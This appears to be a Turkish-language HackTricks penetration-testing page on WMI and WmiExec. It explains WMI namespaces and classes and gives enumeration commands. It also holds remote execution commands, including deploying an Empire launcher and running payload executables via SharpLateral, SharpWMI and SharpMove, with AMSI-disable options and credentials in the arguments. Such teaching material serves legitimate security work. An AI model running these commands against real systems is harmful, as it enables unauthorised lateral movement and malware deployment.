# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl Çalıştığı Açıklandı

Kullanıcı adı ve ya şifre ya da hash bilinen hostlarda süreçler WMI kullanılarak açılabilir. Komutlar Wmiexec tarafından WMI kullanılarak yürütülür ve yarı etkileşimli bir shell deneyimi sağlar.

**dcomexec.py:** Farklı DCOM uç noktalarını kullanarak, bu script wmiexec.py'ye benzer yarı etkileşimli bir shell sunar ve özellikle ShellBrowserWindow DCOM nesnesini kullanır. Şu anda MMC20'yi desteklemektedir. Uygulama, Shell Windows ve Shell Browser Window nesneleri. (kaynak: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## WMI Temelleri

### Namespace

Dizin tarzı bir hiyerarşi içinde yapılandırılmış olan WMI'nın en üst düzey konteyneri \root'tur, altında namespace olarak adlandırılan ek dizinler organize edilmiştir.  
Namespace'leri listelemek için komutlar:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Bir ad alanı içindeki sınıflar şu şekilde listelenebilir:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Sınıflar**

Bir WMI sınıf adını, örneğin win32_process, ve bulunduğu ad alanını bilmek, herhangi bir WMI işlemi için çok önemlidir.  
`win32` ile başlayan sınıfları listelemek için komutlar:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Bir sınıfın çağrılması:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Yöntemler

WMI sınıflarının bir veya daha fazla yürütülebilir işlevi olan yöntemler çalıştırılabilir.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Sıralaması

### WMI Servis Durumu

WMI servisinin çalışıp çalışmadığını doğrulamak için komutlar:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Sistem ve Süreç Bilgileri

WMI aracılığıyla sistem ve süreç bilgilerini toplama:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Saldırganlar için WMI, sistemler veya alanlar hakkında hassas verileri listelemek için güçlü bir araçtır.
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Uzak bir makinedeki yerel yöneticiler veya oturum açmış kullanıcılar gibi belirli bilgileri WMI üzerinden uzaktan sorgulamak, dikkatli komut yapısı ile mümkündür.

### **Manuel Uzaktan WMI Sorgulama**

Uzak bir makinedeki yerel yöneticilerin ve oturum açmış kullanıcıların gizli bir şekilde tanımlanması, belirli WMI sorguları aracılığıyla gerçekleştirilebilir. `wmic`, aynı zamanda bir metin dosyasından okuma yaparak birden fazla düğümde komutları aynı anda çalıştırmayı destekler.

WMI üzerinden bir işlemi uzaktan yürütmek için, örneğin bir Empire ajanı dağıtmak gibi, aşağıdaki komut yapısı kullanılır; başarılı bir yürütme, "0" döndürme değeri ile gösterilir:
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Bu süreç, WMI'nin uzaktan yürütme ve sistem sayımı yeteneğini göstermekte, hem sistem yönetimi hem de penetrasyon testi için faydasını vurgulamaktadır.

## Otomatik Araçlar

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- **Impacket'in `wmiexec`**'ini de kullanabilirsiniz.


## Referanslar

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)


{{#include ../../banners/hacktricks-training.md}}
